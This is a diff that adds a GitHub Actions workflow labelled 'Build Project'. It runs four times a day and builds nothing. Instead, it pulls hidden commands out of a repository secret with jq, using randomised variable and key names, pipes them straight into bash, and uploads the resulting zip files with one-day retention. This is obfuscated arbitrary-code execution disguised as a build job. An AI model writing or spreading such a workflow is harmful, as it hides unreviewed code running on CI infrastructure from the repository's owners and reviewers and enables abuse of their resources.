@@ -1,0 +1,30 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          kn8769: ${{ secrets.kn8769 }}
+        run: |
+          printf '%s' "$kn8769" | jq -r .pln8631 | /bin/bash
+          printf '%s' "$upi4" | jq -r .t33 | /bin/bash
+          printf '%s' "$dj84" | jq -r .d44945 | /bin/bash
+          printf '%s' "$fkcm006" | jq -r .xf39 | /bin/bash
+          echo $qrlkg6502 | jq -r .yw0133 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Fx6kPw4z
+          path: "*.zip"
+          retention-days: 1
